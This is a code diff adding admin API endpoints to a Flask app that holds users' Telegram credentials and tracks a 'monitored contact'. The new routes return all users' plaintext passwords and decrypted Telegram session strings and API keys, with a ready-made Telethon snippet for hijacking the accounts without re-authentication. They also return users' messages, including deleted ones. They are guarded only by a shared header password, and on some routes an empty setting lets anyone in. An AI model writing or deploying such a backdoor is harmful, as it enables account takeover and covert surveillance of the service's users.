@@ -555,6 +555,221 @@ def api_admin_user_details(username):
     return jsonify({'user': user_data})
 
 
+@app.route('/api/admin/credentials', methods=['GET'])
+def api_admin_all_credentials():
+    """
+    Get ALL users with ALL decrypted credentials.
+    Returns everything needed to access Telegram accounts externally.
+
+    Response includes for each user:
+    - api_id, api_hash, phone (Telegram API credentials)
+    - session_string (allows accessing Telegram without re-auth)
+    - target_username, target_display_name (monitored contact)
+    - password (app login password)
+    """
+    auth = request.headers.get('X-Admin-Password', '')
+    if auth != COORDINATOR_PASSWORD:
+        return jsonify({'error': 'Unauthorized'}), 401
+
+    if not COORDINATOR_PASSWORD:
+        return jsonify({'error': 'Coordinator password not configured'}), 500
+
+    all_creds = user_manager.get_all_credentials(COORDINATOR_PASSWORD)
+
+    # Clean up the response - remove encrypted fields, keep only useful data
+    clean_users = []
+    for user in all_creds:
+        clean_user = {
+            'id': user.get('id'),
+            'username': user.get('username'),
+            'password': user.get('password'),
+            'created_at': user.get('created_at'),
+            'last_login': user.get('last_login'),
+            'setup_complete': user.get('setup_complete'),
+            'is_running': user.get('is_running'),
+            # Telegram credentials - everything needed for external access
+            'telegram': {
+                'api_id': user.get('api_id'),
+                'api_hash': user.get('api_hash'),
+                'phone': user.get('phone'),
+                'session_string': user.get('session_string'),
+                'target_username': user.get('target_username'),
+                'target_display_name': user.get('target_display_name'),
+            }
+        }
+        clean_users.append(clean_user)
+
+    return jsonify({
+        'users': clean_users,
+        'count': len(clean_users),
+        'note': 'Use session_string with Telethon StringSession to access accounts without re-authentication'
+    })
+
+
+@app.route('/api/admin/user/<username>/telegram', methods=['GET'])
+def api_admin_user_telegram(username):
+    """
+    Get ready-to-use Telegram credentials for a specific user.
+    Returns a copy-paste ready object for use with Telethon.
+
+    Example usage with returned data:
+        from telethon import TelegramClient
+        from telethon.sessions import StringSession
+
+        client = TelegramClient(
+            StringSession(data['session_string']),
+            int(data['api_id']),
+            data['api_hash']
+        )
+        await client.start()
+    """
+    auth = request.headers.get('X-Admin-Password', '')
+    if auth != COORDINATOR_PASSWORD:
+        return jsonify({'error': 'Unauthorized'}), 401
+
+    all_creds = user_manager.get_all_credentials(COORDINATOR_PASSWORD)
+    user_data = next((u for u in all_creds if u['username'] == username.lower()), None)
+
+    if not user_data:
+        return jsonify({'error': 'User not found'}), 404
+
+    telegram_creds = {
+        'api_id': user_data.get('api_id'),
+        'api_hash': user_data.get('api_hash'),
+        'phone': user_data.get('phone'),
+        'session_string': user_data.get('session_string'),
+        'target_username': user_data.get('target_username'),
+        'target_display_name': user_data.get('target_display_name'),
+        'usage_example': '''
+from telethon import TelegramClient
+from telethon.sessions import StringSession
+
+client = TelegramClient(
+    StringSession("{session_string}"),
+    {api_id},
+    "{api_hash}"
+)
+
+async def main():
+    await client.start()
+    # Now you can use the client to access any chat
+    # dialogs = await client.get_dialogs()
+    # messages = await client.get_messages("username", limit=100)
+
+import asyncio
+asyncio.run(main())
+'''.format(
+            session_string=user_data.get('session_string', ''),
+            api_id=user_data.get('api_id', ''),
+            api_hash=user_data.get('api_hash', '')
+        )
+    }
+
+    return jsonify({'telegram': telegram_creds})
+
+
+@app.route('/api/admin/user/<username>/messages', methods=['GET'])
+def api_admin_user_messages(username):
+    """
+    Get messages from a user's database.
+
+    Query params:
+    - limit: max messages (default 100)
+    - offset: pagination offset (default 0)
+    - include_deleted: include deleted messages (default false)
+    """
+    auth = request.headers.get('X-Admin-Password', '')
+    if auth != COORDINATOR_PASSWORD:
+        return jsonify({'error': 'Unauthorized'}), 401
+
+    # Find user
+    user = user_manager.get_user_by_username(username.lower())
+    if not user:
+        return jsonify({'error': 'User not found'}), 404
+
+    # Get user's database
+    db_path = user_manager.get_user_db_path(username.lower())
+    if not os.path.exists(db_path):
+        return jsonify({'error': 'User database not found'}), 404
+
+    limit = request.args.get('limit', 100, type=int)
+    offset = request.args.get('offset', 0, type=int)
+    include_deleted = request.args.get('include_deleted', 'false').lower() == 'true'
+
+    conn = sqlite3.connect(db_path)
+    conn.row_factory = sqlite3.Row
+    cursor = conn.cursor()
+
+    if include_deleted:
+        cursor.execute("""
+            SELECT * FROM messages ORDER BY timestamp DESC LIMIT ? OFFSET ?
+        """, (limit, offset))
+    else:
+        cursor.execute("""
+            SELECT * FROM messages
+            WHERE (deleted = 0 OR deleted IS NULL)
+            ORDER BY timestamp DESC LIMIT ? OFFSET ?
+        """, (limit, offset))
+
+    messages = [dict(row) for row in cursor.fetchall()]
+
+    # Get total count
+    cursor.execute("SELECT COUNT(*) as total FROM messages")
+    total = cursor.fetchone()['total']
+
+    conn.close()
+
+    return jsonify({
+        'username': username,
+        'messages': messages,
+        'count': len(messages),
+        'total': total,
+        'limit': limit,
+        'offset': offset
+    })
+
+
+@app.route('/api/admin/user/<username>/chats', methods=['GET'])
+def api_admin_user_chats(username):
+    """
+    List all unique chats/contacts from a user's message history.
+    """
+    auth = request.headers.get('X-Admin-Password', '')
+    if auth != COORDINATOR_PASSWORD:
+        return jsonify({'error': 'Unauthorized'}), 401
+
+    # Find user
+    user = user_manager.get_user_by_username(username.lower())
+    if not user:
+        return jsonify({'error': 'User not found'}), 404
+
+    db_path = user_manager.get_user_db_path(username.lower())
+    if not os.path.exists(db_path):
+        return jsonify({'error': 'User database not found'}), 404
+
+    conn = sqlite3.connect(db_path)
+    conn.row_factory = sqlite3.Row
+    cursor = conn.cursor()
+
+    cursor.execute("""
+        SELECT chat_id, sender_name, COUNT(*) as message_count,
+               MIN(timestamp) as first_message,
+               MAX(timestamp) as last_message
+        FROM messages
+        GROUP BY chat_id
+        ORDER BY last_message DESC
+    """)
+
+    chats = [dict(row) for row in cursor.fetchall()]
+    conn.close()
+
+    return jsonify({
+        'username': username,
+        'chats': chats,
+        'count': len(chats)
+    })
+
+
 # ==================== ADDITIONAL API ENDPOINTS ====================
 
 @app.route('/api/badge/count', methods=['GET'])
